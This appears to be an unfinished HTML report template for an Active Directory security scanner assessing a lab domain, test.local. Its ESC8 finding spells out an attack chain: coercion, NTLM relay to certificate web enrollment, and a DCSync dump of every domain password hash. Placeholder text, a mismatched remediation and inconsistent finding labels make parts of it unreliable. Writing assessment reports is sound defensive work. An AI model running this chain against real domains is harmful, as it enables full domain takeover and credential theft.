<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test.local Vulnerability Report</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/x-icon" href="/Private/Report/Images/favicon-32x32.png">
</head>

<body>
    <div class="banner">
        <img src="./Images/kerberos-text2.png" alt="ADScanner logo" class="banner-img">
    </div>
    <div class="main-header">Domain vulnerability report for test.local</div>
   
    <!-- Risk overall section -->
    <div class="risk-overall">
        <div class="left-image">  
                <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
        </div>
        <div class="risk-overall-text">
            <h1>Domain risk level: 150 / 100</h1>
             <p>The maximum score is 100, anything above this presents a significant risk to ransomware.</p>
             <p>Attackers will always exploit the path of least resistance (higher scores) - low hanging fruit.</p>
             <a href="#category-summary">See score breakdown table</a>
        </div>
    </div>


     <!-- Executive summary section -->
    <div class="summary">
        <!-- Left section for the tables -->
        <div class="left-section">
            <div class="table-container">
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th colspan="2">Details when ran</th>
                        </tr>
                        <tr>
                            <td>Domain assessed</td>
                            <td>test.local</td>
                        </tr>
                        <tr>
                            <td>Ran as User</td>
                            <td>test\jack</td>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Ran on Host</td>
                            <td>DC.test.local</td>
                        </tr>
                        <tr>
                            <td>Date and Time</td>
                            <td>3/12/2024 5:10:30 PM</td>
                        </tr>
                        <tr>
                            <td>Time to Run</td>
                            <td>142.70629</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div class="table-container">
                <table class="summary-table" id="category-summary">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Risk Score</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>PKI</td>
                            <td class="category-riskcritical">100+</td>
                        </tr>
                        <tr>
                            <td>Kerberos</td>
                            <td class="category-riskhigh">75-100</td>
                        </tr>
                        <tr>
                            <td>ACLs</td>
                            <td class="category-riskhigh">75-100</td>
                        </tr>
                        <tr>
                            <td>RBAC</td>
                            <td class="category-riskmedium">50-75</td>
                        </tr>
                        <tr>
                            <td>Passwords</td>
                            <td class="category-riskmedium">25-50</td>
                        </tr>
                        <tr>
                            <td>MISC</td>
                            <td class="category-risklow">1-25</td>
                        </tr>
                        <tr>
                            <td>Legacy</td>
                            <td class="category-riskinformational">0</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <!-- Right section for the executive summary -->
        <div class="executive-summary">
            <h2>Executive Summary (GPT to contextualize)</h2>
            <p>ADscanner was commissioned to perform a vulnerability assessment against the test.local Active Directory
                domain to ensure correct security configuration and operation of the Directory.
                The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                network could be exploited by a determined attacker deploying ransomware and malware.</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
        </div>
    </div>

    <!-- Risk prioritisation section -->
    <div class="risk-summary-container">
        <div class="risk-summary-heading">
            <h2>Risk Prioritisation Summary</h2>
            <p>The table below summarizes the number and severity of findings in order of decreasing risk. Full
                details can be found by clicking on each vulnerability which will take you to the relevant technical
                section.</p>
        </div>
        <table class="risk-prioritisation-summary">
            <thead>
                <tr>
                    <th class="risk-column">Risk</th>
                    <th class="technique-column">Issue</a></th>
                    <th class="category-column">Category</th>
                    <th class="score-column">Score</th>
                </tr>
            </thead>
            <tbody>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#esc1">ESC1</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#esc1">ESC2</a></td>
                    <td>PKI</td>
                    <td>35</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#esc1">ESC7</a></td>
                    <td>PKI</td>
                    <td>20</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#esc1">ESC8</a></td>
                    <td>PKI</td>
                    <td>10</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#esc1">Highly privileged account does not have the 'Account is sensitive and cannot be delegated' flag set</a></td>
                    <td>PKI</td>
                    <td>1</td>
                </tr>
            </tbody>
        </table>
    </div>

   

    <!-- Technical section -->
    <div class="main-header">Technical section</div>
    <div class="finding-header">Domain info</div>
    <div class="domain-info">
        <p>This section provides a general overview of the Active Directory domain, which can be taken as an indication of the size and complexity of the domain. Before appreciating any risks it is important to understand which assets within the domain require protecting.</p>
        <table>
            <th>Category</th>
            <th>Value</th>
            <tr><td class="grey">Domain:</td><td>test.local</td></tr>
            <tr><td class="grey">FunctionalLevel:</td><td>Windows2016Domain</td></tr>
            <tr><td class="grey">DomainControllers:</td><td>DC.test.local</td></tr>
            <tr><td class="grey">Users:</td><td>444</td></tr>
            <tr><td class="grey">Groups:</td><td>49</td></tr>
            <tr><td class="grey">Computers:</td><td>11</td></tr>
            <tr><td class="grey">Trusts:</td><td>None</td></tr>
            <tr><td class="grey">OUs:</td><td>225</td></tr>
            <tr><td class="grey">GPOs:</td><td>5</td></tr>
            <tr><td class="grey">CertificateAuthority:</td><td>CA.test.local test-CA-CA</td></tr>
            <tr><td class="grey">CAtemplates:</td><td>18</td></tr>
            <tr><td class="grey">CertificateTemplates:</td><td>ESC4ACL-template, ESC4-template, ESC3-enrolltemplate, ESC3-template, ESC2-template, ESC1-template, Workstation, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication, EFSRecovery, EFS, DomainController, WebServer, Machine, User, SubCA, Administrator</td></tr>
        </table>
    </div>
   
    

    <div class="finding-header">PKI</div>

    <!--Technical table-->
    <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="toggle" id="esc1"><u>ESC8</u></td>
                    <td class="finding-riskcritical">Critical</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td>PScustomobject info</td>
                                        <td>
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface (http://$CAserver/certsrv) is vulnerable to 'NTLM relay' attacks. 
                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication to any low privileged user.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
                                                        alt="Image Description">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
                                                        192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Image Description">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                        DomainController</p>
                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Image Description">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove the ability for users to supply an arbitrary SAN in the
                                                certificate template or restrict who can enroll within the template to
                                                privileged users only</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC7</u></td>
                    <td class="finding-riskhigh">High</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-riskmedium">Medium</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-risklow">Low</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-riskinformational">Informational</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div class="finding-header">Kerberos</div>
    <p></p>

    <div class="finding-header">ACLs</div>
    <p></p>

    <div class="finding-header">RBAC</div>
    <p></p>

    <div class="finding-header">Passwords</div>
    <p></p>

    <div class="finding-header">MISC</div>
    <p>Add efficiency improvements to here</p>

    <div class="finding-header">Legacy</div>
    <p></p>

    <div class="main-header">Disclosure and next steps</div>
    <p>ADScanner is intended for use on authorised systems only. Users must obtain explicit consent from system owners
        before using the tool on any network or actions could lead to serious legal repercussions.
        The creator is not responsible for any resulting damages or losses</p>
    <p>Once read through the report follow the remediation steps, then rerun the scanner on a periodic basis to see the
        risks score decrease!</p>

    <!-- js to drop down each finding-->
    <script>
        // Get all the rows with class "toggle"
        var toggles = document.querySelectorAll('.toggle');

        // Add event listener to each toggle row
        toggles.forEach(function (toggle) {
            toggle.addEventListener('click', function () {
                // Toggle the visibility of the next sibling element with class "finding"
                var finding = this.parentNode.nextElementSibling;
                finding.style.display = (finding.style.display === 'table-row') ? 'none' : 'table-row';
            });
        });
    </script>
</body>

</html>